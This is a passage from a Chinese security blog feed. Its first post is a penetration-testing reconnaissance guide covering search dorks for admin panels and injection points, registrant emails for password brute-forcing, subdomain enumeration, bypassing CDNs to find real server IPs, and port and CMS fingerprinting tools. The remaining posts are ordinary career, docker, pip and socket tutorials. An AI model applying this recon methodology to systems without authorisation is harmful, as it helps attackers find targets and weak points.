        <content type="html"><![CDATA[<p>收集信息采用一种由外到内的收集方式，保证信息的收集尽可能的全面。在渗透测试过程中，我们从各个角度进行测试，需要尽可能的找出网站中的漏洞来编写测试报告，所以只要是与目标网站相关的信息，我们都要尽可能的去收集。</p><p>我们得到一个网站的地址，以 <a href="https://www.baidu.com/">https://www.baidu.com</a> 为例。</p><ul><li>直观信息：利用Google搜索语法搜索网站的信息，可能可以找到后台，或者找到注入点。</li><li>应用层：我们需要收集网站的域名信息，这个网站是谁注册的？这个人的邮箱号是多少？（可以用于密码爆破等）当前域名有多少子域名?</li><li>传输层：我们要知道传输层的UDP和TCP通常没有什么信息，他们通常用于保证网络质量等功能，所以这一层我们不做任何操作。</li><li>网络层：目标网站有哪些IP？那些IP上有哪些服务？那些IP上有哪些端口对外开放？真实世界中域名很有可能会使用CDN的技术，而CDN中只有通常没有我们想要的信息，我们的目标是网站的服务器主机，所以我们需要找到。</li><li>数据链路层：也没有什么关键的信息。</li></ul><p>还有一种比较特殊且常用的方法，指纹识别。</p><h1 id="0x01-直观信息"><a href="#0x01-直观信息" class="headerlink" title="0x01 直观信息"></a>0x01 直观信息</h1><p>圈内常说的Google hacker（逃<br>常用语法：</p><ul><li>site：指定域名。site:edu.cn（所有edu.cn的网站）</li><li>inurl：URL中存在关键词。inurl:?id=（SQL注入等功能）</li><li>intext：网页正文存在关键词。intext:后台（找后台）</li><li>filetype：指定文件类型。filetype:pdf（找电子书）</li><li>link：和当前链接有关联的网页。link:slug01sh.github.com（和我的博客做了友链的博客）</li><li>cache：Google中的缓存</li></ul><p>还可以进行组合搜索。site:edu.cn inurl:?id=</p><p>同理可以在其他搜索引擎进行搜索</p><ul><li>百度</li><li>雅虎</li><li>Bing</li><li>Shodan</li><li>Github</li></ul><h1 id="0x02-应用层"><a href="#0x02-应用层" class="headerlink" title="0x02 应用层"></a>0x02 应用层</h1><p>问：这个网站是谁注册的？他的邮箱是多少？</p><p>收集域名注册。域名服务商、注册人信息（姓名、邮箱信息、地址）、IP地址、备案信息查询</p><ol><li>whois查询</li><li>站长之家</li><li>爱站工具网</li><li>VirusTotal</li><li>ICP备案查询网</li><li>天眼查</li></ol><p>通常主域名会设立一些防护，而一些刚刚开的新子域名没来得及防护，就可以考虑从侧面进行攻击。而在这之前我们最好先把子域名的信息先收集好。收集方法：</p><ul><li>搜索引擎枚举。site:baidu.com，简单暴力</li><li>第三方应用。DNSdumpster、在线DNS侦查、子域名爆破网站（<a href="https://phpinfo.me/domin">https://phpinfo.me/domin</a> ）、IP反查绑定域名网站（<a href="http://dns.aizhan.com/">http://dns.aizhan.com</a> ）</li><li>日志透明度公开日志枚举。<a href="https://crt.sh/">https://crt.sh</a> 和 <a href="https://censys.io/">https://censys.io</a></li><li>子域名扫描器。如：Layer子域名挖掘器、subDomainBrute、Sublist3r</li></ul><h1 id="0x03-网络层"><a href="#0x03-网络层" class="headerlink" title="0x03 网络层"></a>0x03 网络层</h1><p>问：如何判断是否采用CDN？</p><blockquote><p>采用多地ping服务的在线网站（<a href="https://www.17ce.com/">https://www.17ce.com</a> ）</p></blockquote><p>问：如果使用了CDN，应该如何获取真实IP？</p><ul><li>国外访问当前域名（CDN国内外收费不同）</li><li>查看域名的解析记录（可能过去有IP的记录）</li><li>扫描网站测试文件。如phpinfo、test（测试文件没有挂CDN）</li><li>ping分站（分站没有挂CDN）</li><li>抓包分析（数据交互会和真正的服务器交互）</li><li>内部邮箱溯源。邮件服务器IP、ping邮件服务器域名（网站自己的邮件服务器）</li></ul><p>问：如何验证找到的IP的真实性？</p><blockquote><p>测试「80端口的网站」是否和「你域名访问得到的网站」相同。</p></blockquote><p>问：找到IP之后做什么？</p><ul><li>端口信息</li><li>Web路径信息</li></ul><p>问：收集端口信息常用工具有哪些？</p><ul><li>nmap</li><li>masscan</li><li>zmap</li><li>御剑高速TCP端口扫描工具</li></ul><p>TCP/UDP端口列表：<a href="https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8</a></p><p>常见的URL：<a href="http://localhost:4000/article">http://localhost:4000/article</a> 。URL中的域名端口信息都已经进行搜集，在确定了需要攻击的域名和端口之后，如果想要攻击Web服务，就需要先搜集Web目录文件。</p><p>问：如何搜集Web目录文件？</p><blockquote><p>使用扫描器扫描，常用工具：dirsearch。</p></blockquote><h1 id="0x04-指纹识别（博客类）"><a href="#0x04-指纹识别（博客类）" class="headerlink" title="0x04 指纹识别（博客类）"></a>0x04 指纹识别（博客类）</h1><p>CMS是用来管理网站的文章的，通常会有一些框架来套用。这些框架可能由于种种原因被挖掘出了漏洞存在，而管理员又没有及时的更新。可以采用在线的工具进行识别，也可以采用本地识别。<br>常用的本地工具有：</p><ul><li>御剑Web指纹识别</li><li>WhatWeb</li><li>WebRobo</li><li>椰树</li><li>轻量Web指纹识别<br>常用在线工具：</li><li>BugScaner</li><li>云悉指纹</li><li>WhatWeb</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《Web安全攻防》 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全行业个人发展浅析</title>
      <link href="3fa3403da2ba/"/>
      <url>3fa3403da2ba/</url>
      
        <content type="html"><![CDATA[<p>2020年9月的时候，凭借着个人兴趣的驱使。我放弃了自己开发的经历，开始慢慢的转向安全方向。当时没有什么眉目，就只盯着CTF方向开始钻研，开始慢慢懂得了一些漏洞的利用方式。最近在思考自己的安全之路时，我的眼光是迷茫，我不知道自己该学习什么，应该往哪个方向去学习，所以尝试了自己回答以下的问题来帮助自己看清自己的路线。</p><p><strong>0x01 网络安全有哪些工作类型？我想去哪个方向？</strong></p><ul><li>安全研发：工作主要是开发用于安全防御的产品，开发的产品主要用于将已知且常见的漏洞进行防御。</li><li>二进制方向：工作主要偏向于软件破解、病毒分析等工作。</li><li>网络渗透方向：工作主要偏向于网络渗透攻击、攻击网站、攻击个人电脑等。需求广并且方向多，通常也需要比较广的知识面。<br>参考教程：</li></ul><ol><li>小白怎么入门网络安全？看这篇就够啦！：<a href="https://www.cnblogs.com/xuanyuan/p/13624707.html">https://www.cnblogs.com/xuanyuan/p/13624707.html</a></li></ol><p><strong>0x02 红队是什么？</strong></p><p>模拟真实世界的黑客攻击的团队。真实世界的黑客攻击是通过综合利用各种手段来进行黑客攻击的一种方式，其中包括社工等方式（这种方式又叫做APT）。真实世界的黑客极具目的性，但是并不希望被检测到。</p><p><strong>0x03 红队和渗透测试是什么关系？</strong></p><p>渗透测试和红队在技术方向非常类似渗透测试，但是在思维方式上却完全不同。</p><ol><li>渗透测试的重点在于尽可能多的检测出漏洞所在。</li><li>红队的关键点在于尽可能达到目的并且隐藏自己的信息。</li></ol><p>参考教程：</p><ol><li>谈谈渗透测试和红队的区别：<a href="https://www.secrss.com/articles/12168">https://www.secrss.com/articles/12168</a></li></ol><p><strong>0x04 CTF和其他安全方向的关系是什么？</strong></p><p>CTF分为两种模式「解题模式」和「AWD模式」，解题模式通常是为了综合利用各种「Web漏洞」和「安全知识」来获取flag从而赢得分数。大部分时候是运气、实力、细心程度的一种考察，可以用来训练自己，让自己在Web漏洞的掌握上更上一层楼。但是这样的知识只能在红队中进行打点，所获得的知识体系太过于局限了。</p><p><strong>0x05 我现在处于安全届的哪个层次？</strong></p><p>上次gcow团队中童童师傅的评价</p><ul><li>bypass技巧 10%</li><li>网络基础 0%</li><li>常见web漏洞 30%</li><li>代码审计 5%</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/05B07287-4F7B-44EB-82A4-CF44BA78172D.png"></p><p>我是菜鸡，干巴爹👋</p><p><strong>0x06 有哪些比较全面的学习技能点？</strong></p><p>网络安全涉及的内容非常广，其主要的学习路线如下图所示。可以简单归纳为：</p><ul><li>基础知识：Web发展简史、计算机网络、域名系统、HTTP标准、代码审计、WAF</li><li>信息收集：域名信息、 站点信息、端口信息、其它</li><li>内网渗透：Windows信息收集、持久化、Linux信息收集、痕迹清理、其他</li><li>常见漏洞：SQL注入、XSS、CSRF、SSRF、命令注入、文件读取、文件上传、文件包含、XXE、模版注入、Xpath注入、 逻辑漏洞 、业务漏洞、配置安全、中间件、Web Cache欺骗攻击</li><li>语言与框架：PHP、Python、Java、JavaScript、Ruby、C\C++、C#</li><li>防御技术：总体思路、 团队建设、威胁情报、风险控制、加固检查、蜜罐技术、入侵检测、应急响应、溯源分析</li><li>工具与资源：工具列表、推荐资源、爆破工具、下载工具、流量相关、嗅探工具、SQLMap使用</li><li>其他：认证方式、拒绝服务攻击、DNS劫持、Docker</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/340EC80F-6F47-491F-9924-894F778CF411.png"></p><p><strong>0x07 我在哪些方面还有缺陷？</strong></p><p>太多了（</p><p><strong>0x09 如何学习这些知识？</strong></p><p>参考敏捷开发，不断迭代：有一个粗略的认识-&gt;有了进一步的认识-&gt;彻底掌握-&gt;温故而知新。不用纠缠于把一门课程全部学完学懂才进入下一门课程。</p><p>参考教程：</p><ol><li>网络安全自学篇（二十三）| Web安全学习路线及木马、病毒和防御初探：<a href="https://cloud.tencent.com/developer/article/1620918">https://cloud.tencent.com/developer/article/1620918</a></li></ol><p><strong>0x10 接下来我应该怎么做？</strong></p><ul><li>分析各种招聘的要求，确定学习目标</li><li>制定学习计划</li><li>寻找学习资源进行学习</li><li>及时总结和回顾</li></ul>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker-compose介绍以及简单使用</title>
      <link href="90f3483c9d34/"/>
      <url>90f3483c9d34/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><h2 id="1-1-docker"><a href="#1-1-docker" class="headerlink" title="1.1 docker"></a>1.1 docker</h2><p>按照下面的步骤进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 更新现有的包</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"># 添加Docker PGP公钥</span><br><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"># 配置Docker APT库</span><br><span class="line">echo &#39;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian buster stable&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line"># 更新一下APT列表</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"># 安装Docker，在安装前先删除原来系统中可能自带的Docker：</span><br><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br><span class="line"></span><br><span class="line"># 安装Docker:</span><br><span class="line">sudo apt-get install docker-ce</span><br><span class="line"></span><br><span class="line"># 看看安装成功了没:</span><br><span class="line">sudo docker run hello-world</span><br><span class="line"></span><br><span class="line"># 设置启动</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="1-2-docker-compose"><a href="#1-2-docker-compose" class="headerlink" title="1.2 docker-compose"></a>1.2 docker-compose</h2><p>获取执行文件到本地（可能需要sudo）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><p>为可执行文件设置权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><p>确定是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version</span><br></pre></td></tr></table></figure><p>最后的效果:<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/15906035-DA64-401D-9C4C-BEE8738BDB68.png"></p><h1 id="2-docker-compose介绍"><a href="#2-docker-compose介绍" class="headerlink" title="2 docker-compose介绍"></a>2 docker-compose介绍</h1><p>首先需要知道 docker-compose 是为了解决什么场景而出现的。</p><p>运行 docker 需要使用长而繁杂的命令。如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --detach \</span><br><span class="line">  --name registry \</span><br><span class="line">  --hostname registry \</span><br><span class="line">  --volume $(<span class="built_in">pwd</span>)/app/registry:/var/lib/registry \</span><br><span class="line">  --publish 5000:5000 \</span><br><span class="line">  --restart unless-stopped \</span><br><span class="line">  registry:latest</span><br></pre></td></tr></table></figure><p>为了方便运行，可以将这种docker run写成shell文件。</p><p>web 镜像确比这更为复杂，一个简单的 docker run 命令不足以开启一个 Web 服务，通常需要多个镜像，镜像之间还会有一些优先关系。这种关系的编排就叫做 docker 的编排。</p><p>docker 提供一个命令行工具 docker-compose 来帮助完成 docker 的编排，要使用 docker-compose 需要编写一个 docker-compose.yml 文件（配置文件）。<br>例如：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">beginor/geoserver:2.11.1</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">geoserver-web</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">geoserver-web</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./web/data_dir:/geoserver/data_dir</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./web/logs:/geoserver/logs</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">database:database</span></span><br><span class="line">  <span class="attr">database:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">beginor/postgis:9.3</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgis</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">postgis</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5432</span><span class="string">:5432</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./database/data:/var/lib/postgresql/data</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">1q2w3e4R</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><p>上面的yml文件定义了两个服务web和database，一个服务在运行时对应一个容器的实例，上面的文件表示要启动两个实例。</p><p>在部署时，通常需要将 docker-compose.yml 文件放到一个目录下，表示一个应用，docker 会为这个应用创建独立的网络。</p><p>可以使用 <code>docker-compose up -d</code> 来启动这个程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/<span class="built_in">source</span> » docker-compose up -d                                                                                                                       255 ↵ littlechieh6@MacBook-Pro</span><br><span class="line">Creating network <span class="string">&quot;source_app1&quot;</span> with the default driver</span><br><span class="line">Building server</span><br><span class="line">Step 1/6 : FROM ubuntu:16.04</span><br><span class="line">16.04: Pulling from library/ubuntu</span><br><span class="line">be8ec4e48d7f: Pull complete</span><br><span class="line">33b8b485aff0: Pull complete</span><br><span class="line">d887158cc58c: Pull complete</span><br><span class="line">05895bb28c18: Pull complete</span><br><span class="line">Digest: sha256:3355b6e4ba1b12071ba5fe9742042a2f10b257c908fbdfac81912a16eb463879</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:16.04</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>要停止上面的容器，只需要输入 <code>docker-compose down</code> 即可。</p><p>从上面的命令可以看出，docker-compose 不仅可以根据配置文件 docker-compose.yml 自动创建网络，启动响应的容器实例，也可以根据配置删除容器实例。</p><h1 id="3-docker-compose使用"><a href="#3-docker-compose使用" class="headerlink" title="3 docker-compose使用"></a>3 docker-compose使用</h1><p>常用的命令：<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 启动 docker-compose 的实例</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭 docker-compose 的实例</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机正在运行的容器</span></span><br><span class="line">docker container ls</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来查看 docker 容器的输出，即容器里面 Shell 的标准输出。</span></span><br><span class="line">$ docker container logs [containerID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">$ docker container <span class="built_in">exec</span> -it [containerID] /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p> 参考教程：</p><ol><li>使用 docker-compose 替代 docker run：<a href="https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html">https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html</a></li><li>Kali Linux 2020.1 Release安装Docker-CE：<a href="https://zhuanlan.zhihu.com/p/110675842">https://zhuanlan.zhihu.com/p/110675842</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Or Mac安装pip2 Or pip3</title>
      <link href="9c6d4c3c0aab/"/>
      <url>9c6d4c3c0aab/</url>
      
        <content type="html"><![CDATA[<p>🙃为什么 Kali 的 Python 不自带 pip？为什么？为什么？</p><h1 id="1-Python2"><a href="#1-Python2" class="headerlink" title="1 Python2"></a>1 Python2</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载代码</span></span><br><span class="line">wget https://bootstrap.pypa.io/2.6/get-pip.py</span><br><span class="line"><span class="comment"># python 进行安装</span></span><br><span class="line">python2 get-pip.py</span><br><span class="line"><span class="comment"># 验证是否安装成功</span></span><br><span class="line">pip -V</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-Python3"><a href="#2-Python3" class="headerlink" title="2 Python3"></a>2 Python3</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载代码</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line"><span class="comment"># python 进行安装</span></span><br><span class="line">python3 get-pip.py</span><br><span class="line"><span class="comment"># 验证是否安装成功</span></span><br><span class="line">pip -V</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程之socket简单使用</title>
      <link href="45648d0cead8/"/>
      <url>45648d0cead8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h1><p>Python 提供两个级别的服务：</p><ol><li>Socket（低级别）</li><li>SocketServer（高级别）</li></ol><p>什么是 Socket？俗称「套接字」，对 TCP 协议的抽象，可以用于主机之间或者进程之间的通信。</p><p>首先用一个简单实例来了解 socket 创建、连接、通信的基本步骤。server 端的基本步骤：</p><ol><li>绑定 hostname、port</li><li>使用 accept 方法进行等待</li><li>将消息发送给 client 端</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 引入模块</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象，套接字家族选用AF_INET，套接字类型选用面向连接。</span></span><br><span class="line">server_socket = socket.socket(</span><br><span class="line">    family=socket.AF_INET,</span><br><span class="line">    type=socket.SOCK_STREAM</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本机主机名:MacBook-Pro.local</span></span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定端口号</span></span><br><span class="line">server_socket.bind((host, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大连接数，超过后排队</span></span><br><span class="line">server_socket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    client_socket, addr = server_socket.accept()</span><br><span class="line">    print(<span class="string">f&#x27;连接地址：<span class="subst">&#123;addr&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    message = <span class="string">&#x27;Hello world, socket!&#x27;</span></span><br><span class="line">    client_socket.send(</span><br><span class="line">        message.encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>client端的基本步骤：</p><ol><li>指定 hostname、port 连接到服务</li><li>接受消息</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象</span></span><br><span class="line">s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本机名，设置端口号</span></span><br><span class="line">hostname = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务</span></span><br><span class="line">s.connect(</span><br><span class="line">    (hostname, port)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受消息</span></span><br><span class="line">message = s.recv(<span class="number">1024</span>)</span><br><span class="line">print(message.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-端口"><a href="#2-端口" class="headerlink" title="2 端口"></a>2 端口</h1><p>一个套接字只是用户程序和内核信息交互的枢纽，他自身没有太多信息，也没有网络协议和端口号。在进行网络通信时，必须把一个套接字和一个地址相关联，这个过程就是地址绑定的过程。</p><p>许多时候内核会自动绑定一个地址，然而很多时候为了方便记忆和管理，都会进行手动绑定。最典型的情况就是服务器进程绑定一个端口，等待其他的进程进行连接。</p><p>下面进行简单的验证，server端的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 引入模块</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象，套接字家族选用AF_INET，套接字类型选用面向连接。</span></span><br><span class="line">server_socket = socket.socket(</span><br><span class="line">    family=socket.AF_INET,</span><br><span class="line">    type=socket.SOCK_STREAM</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本机主机名:MacBook-Pro.local</span></span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定端口号</span></span><br><span class="line">server_socket.bind((host, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大连接数，超过后排队</span></span><br><span class="line">server_socket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    client_socket, addr = server_socket.accept()</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    print(<span class="string">f&#x27;连接地址：<span 